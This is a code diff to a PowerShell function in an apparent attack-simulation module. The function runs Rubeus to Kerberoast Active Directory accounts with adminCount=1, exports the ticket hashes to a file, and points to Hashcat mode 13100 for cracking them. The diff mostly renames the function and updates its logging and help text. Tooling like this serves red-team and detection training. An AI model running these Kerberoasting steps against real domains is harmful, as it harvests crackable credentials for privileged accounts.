@@ -1,4 +1,34 @@
-function Start-KerberoastingAttack {
+<#
+.SYNOPSIS
+Requests Kerberos service tickets and exports hashes for offline analysis.
+
+.DESCRIPTION
+Offers the current user domain or another forest domain, then resolves a preferred controller and output path.
+Removes a previous output file and runs Rubeus Kerberoasting with the admincount=1 LDAP filter.
+If an output file exists, offers to open it. This function exports hashes; it does not crack passwords.
+
+.EXAMPLE
+Invoke-Kerberoasting
+Runs this workflow using the initialized AS2Go module configuration.
+
+.INPUTS
+None. This function does not declare pipeline input.
+
+.OUTPUTS
+Console messages and output from invoked commands; no dedicated result object is defined.
+
+.NOTES
+Private AS2Go function. Run from an initialized AS2Go module session.
+Requires Rubeus, a usable domain context, and initialized controller, tools, and exfiltration paths.
+
+.COMPONENT
+Category: Main Function
+
+.FUNCTIONALITY
+Selects a domain and requests service tickets for accounts matching adminCount=1.
+Exports ticket hashes with Rubeus for offline analysis and offers to open the resulting file.
+#>
+function Invoke-Kerberoasting {
 
     ################################################################################
     ######                                                                     #####
@@ -9,10 +39,7 @@ function Start-KerberoastingAttack {
     ######                                                                     #####
     ################################################################################
 
-    $CurrentFunction = Get-FunctionName
-    Write-Log -Message "### Start Function $CurrentFunction ###"
-    $StartRunTime = (Get-Date).ToString($Script:DateFormatLog)
-    #################### main code | out- host #####################
+    $Info = Measure-FunctionRuntime -Begin
 
     $dnsdomain = $env:USERDNSDOMAIN
     $bestdc = $Script:BestDCs[$dnsdomain]
@@ -20,7 +47,7 @@ function Start-KerberoastingAttack {
 
     # example: .\Rubeus.exe kerberoast /domain:SANDBOX.CORP /outfile:.\SANDBOX.CORP.hashes.txt
     
-    Invoke-Output -Type CodeSnippet -Message "Command:"
+    Write-AS2GoOutput -Type CodeSnippet -Message "Command:"
     Write-Highlight -Text "  .\Rubeus.exe ", "kerberoast ", "/domain:", "$dnsdomain", " /dc:", "$bestdc", " /outfile:", "$hashes" `
         -Color $fgcC, $fgcF, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV
 
@@ -64,7 +91,7 @@ function Start-KerberoastingAttack {
         if (Test-Path $hashes) {
             Invoke-Item $hashes
             Write-Host ""
-            Invoke-output -Type Success -Message "Roasted hashes were successfully generated for the domain '$dnsdomain'." -NoExtraLines 
+            Write-AS2GoOutput -Type Success -Message "Roasted hashes were successfully generated for the domain '$dnsdomain'." -NoExtraLines 
         
             If ($UnAttended) { Start-Sleep 2 } else { Pause }
 
@@ -73,7 +100,7 @@ The next step is to crack the roasted hashes using Hashcat.
     In this example, the password policy is known, so a brute-force or mask attack can be used.
     The Hashcat mode for Kerberos 5 TGS-REP hashes is 13100.
 "@     
-            #Invoke-Output -Type  Info -M $message
+            #Write-AS2GoOutput -Type  Info -M $message
 
             Write-Host "`n"
             write-host "  [i] The next step is to " -NoNewline; write-host "crack " -NoNewline -ForegroundColor $fgcH 
@@ -91,15 +118,12 @@ The next step is to crack the roasted hashes using Hashcat.
 
         }
         else {
-            Invoke-Output -Type Warning -Message "No results returned by LDAP, chose a different domain."
+            Write-AS2GoOutput -Type Warning -Message "No results returned by LDAP, chose a different domain."
         }
 
         #If ($UnAttended) { Start-Sleep 2 } else { Pause }
     }
 
 
-    ######################## main code ############################
-    $runtime = Get-RunTime -StartRunTime $StartRunTime
-    Write-Log -Message "    Run Time: $runtime [h] ###"
-    Write-Log -Message "### End Function $CurrentFunction ###"
+    Measure-FunctionRuntime -End -Details $Info
 }
